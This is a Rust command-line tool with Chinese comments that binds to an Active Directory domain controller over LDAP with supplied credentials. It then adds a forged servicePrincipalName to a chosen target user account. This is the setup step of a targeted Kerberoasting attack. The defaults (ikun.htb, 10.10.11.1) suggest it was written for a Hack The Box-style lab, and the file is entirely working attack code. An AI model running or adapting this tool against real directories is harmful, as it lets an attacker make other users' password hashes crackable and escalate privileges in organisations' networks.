use ldap3::{LdapConn, Scope, SearchEntry};
use std::collections::HashSet;
use std::error::Error;
use std::io::{self, Write};
use std::time::SystemTime;

// 获取当前时间戳并格式化为字符串
fn get_timestamp() -> String {
    let now = SystemTime::now();
    let datetime = chrono::DateTime::<chrono::Local>::from(now);
    datetime.format("%Y-%m-%d %H:%M:%S").to_string()
}

// 主函数，处理LDAP连接和SPN修改
fn main() -> Result<(), Box<dyn Error>> {
    // 初始化日志
    println!("[{}] === 开始执行Ikun SPN修改程序 ===", get_timestamp());

    // 提示输入域控制器IP地址
    println!("[{}] [输入] 请输入DC IP地址 (默认: 10.10.11.1): ", get_timestamp());
    io::stdout().flush()?;
    let mut dc_ip = String::new();
    io::stdin().read_line(&mut dc_ip)?;
    let dc_ip = dc_ip.trim().to_string();
    let dc_ip = if dc_ip.is_empty() { "10.10.11.1".to_string() } else { dc_ip };
    println!("[{}] [确认] 使用DC IP: {}", get_timestamp(), dc_ip);

    // 提示输入域名
    println!("[{}] [输入] 请输入域名 (默认: ikun.htb): ", get_timestamp());
    io::stdout().flush()?;
    let mut domain = String::new();
    io::stdin().read_line(&mut domain)?;
    let domain = domain.trim().to_string();
    let domain = if domain.is_empty() { "ikun.htb".to_string() } else { domain };
    println!("[{}] [确认] 使用域名: {}", get_timestamp(), domain);

    // 提示输入认证用户名
    println!("[{}] [输入] 请输入认证用户名 (默认: cxk): ", get_timestamp());
    io::stdout().flush()?;
    let mut username = String::new();
    io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();
    let username = if username.is_empty() { "cxk".to_string() } else { username };
    println!("[{}] [确认] 使用用户名: {}", get_timestamp(), username);

    // 提示输入认证密码
    println!("[{}] [输入] 请输入认证密码 (默认: ikun): ", get_timestamp());
    io::stdout().flush()?;
    let mut password = String::new();
    io::stdin().read_line(&mut password)?;
    let password = password.trim().to_string();
    let password = if password.is_empty() { "ikun".to_string() } else { password };
    println!("[{}] [确认] 密码已输入", get_timestamp());

    // 提示输入目标用户名
    println!("[{}] [输入] 请输入要修改的目标用户 (默认: heizi): ", get_timestamp());
    io::stdout().flush()?;
    let mut target_user = String::new();
    io::stdin().read_line(&mut target_user)?;
    let target_user = target_user.trim().to_string();
    let target_user = if target_user.is_empty() { "heizi".to_string() } else { target_user };
    println!("[{}] [确认] 目标用户: {}", get_timestamp(), target_user);

    // 提示输入伪造的SPN
    println!("[{}] [输入] 请输入要添加的伪造SPN (默认: ikun/heizi): ", get_timestamp());
    io::stdout().flush()?;
    let mut fake_spn = String::new();
    io::stdin().read_line(&mut fake_spn)?;
    let fake_spn = fake_spn.trim().to_string();
    let fake_spn = if fake_spn.is_empty() { "ikun/heizi".to_string() } else { fake_spn };
    println!("[{}] [确认] 使用SPN: {}", get_timestamp(), fake_spn);

    // 连接到LDAP服务器
    println!("[{}] [进度] 正在尝试连接到LDAP服务器: {}", get_timestamp(), dc_ip);
    let mut ldap = match LdapConn::new(format!("ldap://{}", dc_ip).as_str()) {
        Ok(ldap) => {
            println!("[{}] [成功] LDAP连接成功", get_timestamp());
            ldap
        }
        Err(e) => {
            println!("[{}] [错误] LDAP连接失败: {}", get_timestamp(), e);
            return Err(Box::new(e));
        }
    };

    // 执行认证
    println!("[{}] [进度] 正在进行用户认证: {}", get_timestamp(), username);
    let bind = match ldap.simple_bind(&format!("{}\\{}", domain, username), &password) {
        Ok(bind) => {
            println!("[{}] [成功] 认证成功: {}", get_timestamp(), username);
            bind
        }
        Err(e) => {
            println!("[{}] [错误] 认证失败: {}", get_timestamp(), e);
            return Err(Box::new(e));
        }
    };

    // 搜索目标用户的distinguishedName
    let search_base = format!("dc={},dc={}", domain.split('.').next().unwrap(), domain.split('.').nth(1).unwrap());
    println!("[{}] [进度] 使用搜索基础: {}", get_timestamp(), search_base);
    println!("[{}] [进度] 正在搜索目标用户: {}", get_timestamp(), target_user);

    let (rs, _result) = match ldap.search(
        search_base.as_str(),
        Scope::Subtree,
        &format!("(sAMAccountName={})", target_user),
        vec!["distinguishedName"],
    ) {
        Ok(search) => match search.success() {
            Ok((rs, result)) => (rs, result),
            Err(e) => {
                println!("[{}] [错误] 搜索失败: {}", get_timestamp(), e);
                return Err(Box::new(e));
            }
        },
        Err(e) => {
            println!("[{}] [错误] 搜索失败: {}", get_timestamp(), e);
            return Err(Box::new(e));
        }
    };

    if rs.is_empty() {
        println!("[{}] [错误] 未找到目标用户: {}", get_timestamp(), target_user);
        return Err("未找到目标用户".into());
    }

    let entry = SearchEntry::construct(rs[0].clone());
    let dn = entry.attrs.get("distinguishedName").unwrap()[0].to_string();
    println!("[{}] [成功] 找到目标用户DN: {}", get_timestamp(), dn);

    // 修改servicePrincipalName属性
    println!("[{}] [进度] 尝试为用户 {} 添加SPN: {}", get_timestamp(), target_user, fake_spn);
    let modify_result = match ldap.modify(
        dn.as_str(),
        vec![
            ldap3::Mod::Add("servicePrincipalName".to_string(), HashSet::from([fake_spn.to_string()])),
        ],
    ) {
        Ok(modify) => modify,
        Err(e) => {
            println!("[{}] [错误] 添加SPN失败: {}", get_timestamp(), e);
            return Err(Box::new(e));
        }
    };

    // 检查并打印修改结果
    if modify_result.rc == 0 {
        println!("[{}] [成功] 成功为 {} 添加SPN: {}", get_timestamp(), target_user, fake_spn);
    } else {
        println!("[{}] [错误] 添加SPN失败: {:?}", get_timestamp(), modify_result);
    }

    // 断开LDAP连接
    println!("[{}] [进度] 正在断开LDAP连接", get_timestamp());
    if let Err(e) = ldap.unbind() {
        println!("[{}] [错误] 断开LDAP连接失败: {}", get_timestamp(), e);
        return Err(Box::new(e));
    }
    println!("[{}] [成功] LDAP连接已断开", get_timestamp());
    println!("[{}] === Ikun SPN修改程序执行完成 ===", get_timestamp());

    Ok(())
}